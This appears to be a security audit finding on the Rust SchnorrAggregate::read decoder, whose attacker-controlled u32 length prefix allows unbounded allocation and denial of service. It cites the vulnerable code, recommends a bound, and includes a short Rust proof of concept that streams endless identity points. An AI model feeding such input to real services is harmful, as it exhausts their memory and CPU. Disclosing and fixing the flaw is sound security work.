### Title
Untrusted SchnorrAggregate length prefix permits unbounded allocation and denial of service - ([File: crypto/schnorr/src/aggregate.rs](crypto/schnorr/src/aggregate.rs))

### Summary
`SchnorrAggregate::read` trusts an attacker-controlled `u32` count and deserializes that many group elements before reading the final scalar. [1](#0-0)  Because there is no upper bound, a public serialization can force the decoder to consume and retain up to `u32::MAX` points before discovering whether the aggregate is complete. [2](#0-1) 

### Finding Description
The decoder reads four bytes, interprets them as a little-endian length, and pushes one `C::G` per declared element into `Rs`. [2](#0-1)  Each element is decoded with `C::read_G`, but successful points remain allocated in the vector and failures only abort the current read. [3](#0-2)  `C::read_G` itself performs bounded canonical decoding for each individual point, so the vulnerability is the unbounded outer repetition rather than malformed point decoding. [4](#0-3) 

### Impact Explanation
An attacker who can supply bytes to `SchnorrAggregate::read` can specify `0xffffffff` and stream repeated canonical point encodings. [2](#0-1)  The victim stores every decoded point in memory while also spending CPU decoding it, enabling resource-exhaustion denial of service proportional to the supplied stream. [3](#0-2) 

### Likelihood Explanation
The length field and all following bytes are fully attacker-controlled public input. [1](#0-0)  No authentication, proof validity, message length, or aggregate-size restriction is applied before the loop begins. [2](#0-1) 

### Recommendation
Introduce a protocol-specific maximum aggregate count before allocating or looping, and reject inputs exceeding it. [2](#0-1)  If the expected number of signatures is known, pass it to the reader and require equality; otherwise wrap the input in `Read::take` and impose a conservative maximum such as the maximum supported participant count. [1](#0-0) 

### Proof of Concept
```rust
use std::io::{self, Read};

use dalek_ff_group::Ristretto;
use schnorr::aggregate::SchnorrAggregate;

struct EndlessCanonicalPoint;

impl Read for EndlessCanonicalPoint {
  fn read(&mut self, out: &mut [u8]) -> io::Result<usize> {
    // Ristretto identity point encoding.
    out.fill(0);
    Ok(out.len())
  }
}

fn main() {
  let mut prefix = u32::MAX.to_le_bytes().to_vec();
  prefix.extend(std::iter::repeat(0).take(32));

  let mut cursor = std::io::Cursor::new(prefix).chain(EndlessCanonicalPoint);

  // Attempts to decode and retain u32::MAX points before requiring a scalar.
  let _ = SchnorrAggregate::<Ristretto>::read(&mut cursor);
}
```

The declared count controls the number of loop iterations without any limit. [2](#0-1)  The decoded points are accumulated in `Rs`, so a sufficiently long attacker-controlled stream consumes increasing memory before decoding can complete. [3](#0-2)

### Citations

**File:** crypto/schnorr/src/aggregate.rs (L77-87)
```rust
  pub fn read<R: Read>(reader: &mut R) -> io::Result<Self> {
    let mut len = [0; 4];
    reader.read_exact(&mut len)?;

    #[allow(non_snake_case)]
    let mut Rs = vec![];
    for _ in 0 .. u32::from_le_bytes(len) {
      Rs.push(C::read_G(reader)?);
    }

    Ok(SchnorrAggregate { Rs, s: C::read_F(reader)? })
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```
